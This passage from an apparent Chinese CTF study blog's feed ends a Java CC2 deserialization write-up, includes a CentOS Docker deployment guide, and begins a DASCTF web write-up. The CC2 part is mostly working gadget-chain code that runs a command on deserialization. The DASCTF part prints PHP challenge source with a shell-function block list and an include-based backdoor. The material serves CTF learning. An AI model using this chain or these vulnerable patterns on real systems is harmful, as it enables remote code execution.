spellcheck="true">//添加AbstractTranslet的搜索路径</span>        CtClass payload<span class="token operator">=</span>classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"CommonsCollections22222222222"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//创建一个新的public类</span>        payload<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>classPool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>AbstractTranslet<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet</span>        payload<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token operator">=</span>payload<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//转换为byte数组</span>        <span class="token comment" spellcheck="true">//制作templatesImpl</span>        Object templatesImpl<span class="token operator">=</span>Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//反射创建TemplatesImpl</span>        Field field<span class="token operator">=</span>templatesImpl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//反射获取templatesImpl的_bytecodes字段</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//暴力反射</span>        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>bytes<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将templatesImpl上的_bytecodes字段设置为runtime的byte数组</span>        Field field1<span class="token operator">=</span>templatesImpl<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//反射获取templatesImpl的_name字段</span>        field1<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//暴力反射</span>        field1<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将templatesImpl上的_name字段设置为test</span>        <span class="token comment" spellcheck="true">//制作transformer</span>        InvokerTransformer transformer<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//接下来只需调用transformer.transform(templatesImpl)</span><span class="token comment" spellcheck="true">//        transformer.transform()</span>        TransformingComparator comparator<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token punctuation">(</span>transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        PriorityQueue queue<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//让size=2</span>        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        反射，强行往queue塞templatesImpl</span>        Class <span class="token class-name">queueClass</span><span class="token operator">=</span>queue<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field queueField<span class="token operator">=</span>queueClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"queue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queueField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queueField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templatesImpl<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//反射强写comparator</span>        Class <span class="token class-name">clazz</span><span class="token operator">=</span>queue<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field comparatorField<span class="token operator">=</span>clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"comparator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        comparatorField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        comparatorField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span> comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b<span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">deserialize</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> ChainedTransformer <span class="token function">getChainedTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        ConstantTransformer ct<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        InvokerTransformer it1<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>                <span class="token string">"getMethod"</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        InvokerTransformer it2<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>                <span class="token string">"invoke"</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        InvokerTransformer it_exec<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>                <span class="token string">"exec"</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> a<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>ct<span class="token punctuation">,</span>it1<span class="token punctuation">,</span>it2<span class="token punctuation">,</span>it_exec<span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer chain<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> chain<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>java cc2链学习的博客拖了挺久的，七月多就开始写了，一直写到9月2日，中间学车加上出去旅游浪费了一段时间，后面会加快进度，尽快先将cc链部分赶紧看完，先熟悉一遍，然后在此基础上复现一些java类型题目，反过头再把cc链详细学习，cc链学习着实让人头大。</p><p>参考链接：<br><a href="https://www.cnblogs.com/kingbridge/articles/16141397.html">https://www.cnblogs.com/kingbridge/articles/16141397.html</a><br><a href="https://www.cnblogs.com/0x7e/p/14400933.html">https://www.cnblogs.com/0x7e/p/14400933.html</a><br><a href="https://blog.csdn.net/weixin_43818995/article/details/122184245">https://blog.csdn.net/weixin_43818995/article/details/122184245</a><br><a href="https://blog.csdn.net/qq_44769520/article/details/124849524">https://blog.csdn.net/qq_44769520/article/details/124849524</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用docker在CentOS服务器部署网页</title>
      <link href="/2022/08/29/%E4%BD%BF%E7%94%A8docker%E5%9C%A8CentOS%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2%E7%BD%91%E9%A1%B5/"/>
      <url>/2022/08/29/%E4%BD%BF%E7%94%A8docker%E5%9C%A8CentOS%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2%E7%BD%91%E9%A1%B5/</url>
      
        <content type="html"><![CDATA[<h1 id="使用docker在CentOS服务器部署网页"><a href="#使用docker在CentOS服务器部署网页" class="headerlink" title="使用docker在CentOS服务器部署网页"></a>使用docker在CentOS服务器部署网页</h1><h2 id="CentOS防火墙"><a href="#CentOS防火墙" class="headerlink" title="CentOS防火墙"></a>CentOS防火墙</h2><p>首先要打开CentOS防火墙。<br>查看防火墙某个端口是否开放：<code>firewall-cmd --query-port=8888/tcp</code><br>开放防火墙端口，如：8888：<code>firewall-cmd --zone=public --add-port=8888/tcp --permanent</code><br>注意：开放端口后要重启防火墙生效<br>重启防火墙：<code>systemctl restart firewalld</code><br>其他一些命令：<a href="https://blog.csdn.net/qq_38766930/article/details/123707354">Centos8开放防火墙端口</a></p><h2 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h2><pre class=" language-linux"><code class="language-linux">yum -y install docker</code></pre><p>然后尝试开启docker服务</p><pre class=" language-linux"><code class="language-linux">service docker start或systemctl start docker</code></pre><p>一般会有报错，首先看<a href="https://www.jianshu.com/p/45d158a45582">CentOS7安装docker无法启动的问题解决</a>，如果仍有报错Failed to start docker.service: Unit docker.service not found，是因为CentOS默认使用podman代替docker，所以需要将podman卸载，并且重新安装docker。具体可看<a href="https://blog.csdn.net/qiao_xinxin/article/details/114943904">centos8 安装docker解决:Failed to start docker.service: Unit docker.service not found.</a></p><h2 id="docker部署"><a href="#docker部署" class="headerlink" title="docker部署"></a>docker部署</h2><p>如果是自己写的项目，可以直接把文件导入，然后在进入目录，输入</p><pre class=" language-docker"><code class="language-docker">docker build . <span class="token punctuation">-</span>t &lt;name<span class="token punctuation">></span><span class="token punctuation">:</span>&lt;tag<span class="token punctuation">></span></code></pre><p>然后输入docker images，查看image id。最后输入</p><pre class=" language-docker"><code class="language-docker">docker run <span class="token punctuation">-</span>d <span class="token punctuation">-</span>p &lt;ip port<span class="token punctuation">></span><span class="token punctuation">:</span>&lt;port<span class="token punctuation">></span> &lt;image id<span class="token punctuation">></span></code></pre><p>其中ip port是你服务器的端口，port是你创建的容器开放的端口。<br>ip port最好选大于一万的，或是没有特殊性质的，8888和6666端口均无法正常使用。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vps </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2022.07赋能赛web学习</title>
      <link href="/2022/08/18/DASCTF2022.07%E8%B5%8B%E8%83%BD%E8%B5%9Bweb%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/08/18/DASCTF2022.07%E8%B5%8B%E8%83%BD%E8%B5%9Bweb%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="DASCTF2022-07赋能赛web学习"><a href="#DASCTF2022-07赋能赛web学习" class="headerlink" title="DASCTF2022.07赋能赛web学习"></a>DASCTF2022.07赋能赛web学习</h1><h2 id="Ez-to-getflag"><a href="#Ez-to-getflag" class="headerlink" title="Ez to getflag"></a>Ez to getflag</h2><p>打开环境<br><img src="https://kingofkb.github.io/medias/image/20220725/start.png"><br>两个页面，图片查看和图片上传，先试着search，抓包<br><img src="https://kingofkb.github.io/medias/image/20220725/upload.png"><br>可以依次读到源码。<br>upload.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$upload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">uploadfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>知道还有class.php，读取</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">Upload</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$fname</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$fsize</span><span class="token punctuation">;</span>        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">savefile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token variable">$fname</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".png"</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">'./upload/'</span><span class="token punctuation">.</span><span class="token variable">$fname</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">'./upload/'</span><span class="token punctuation">.</span><span class="token variable">$fname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$fname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">echo</span> <span class="token string">"upload success! :D"</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$cont</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">fname</span><span class="token punctuation">;</span>            <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">fsize</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$cont</span><span class="token operator">-</span><span class="token operator">></span><span class="token variable">$size</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">'this_is_upload'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">uploadfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">savefile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>         <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">file_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token variable">$allowed_types</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token keyword">echo</span> <span class="token string">"what are you uploaded? :0"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span><span class="token punctuation">{</span>                 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span><span class="token variable">$allowed_types</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string">'/&lt;\?php|php|exec|passthru|popen|proc_open|shell_exec|system|phpinfo|assert|chroot|getcwd|scandir|delete|rmdir|rename|chgrp|chmod|chown|copy|mkdir|file|file_get_contents|fputs|fwrite|dir/i'</span><span class="token punctuation">;</span>                    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token keyword">echo</span> <span class="token string">'what are you doing!! :C'</span><span class="token punctuation">;</span>                        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                 <span class="token punctuation">}</span>                 <span class="token keyword">else</span> <span class="token punctuation">{</span>                     <span class="token keyword">echo</span> <span class="token string">'png onlyyy! XP'</span><span class="token punctuation">;</span>                     <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                 <span class="token punctuation">}</span>             <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$fname</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$fname</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http|https|file:|php:|gopher|dict|\.\./i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'illegal fname :P'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$src</span> <span class="token operator">=</span> <span class="token string">"data:jpg;base64,"</span><span class="token punctuation">.</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;img src={$src} />"</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>                <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">ok</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token variable">$door</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$door</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string">"hacked!!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"illegal fname XD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">=</span><span class="token string">"It's works"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token 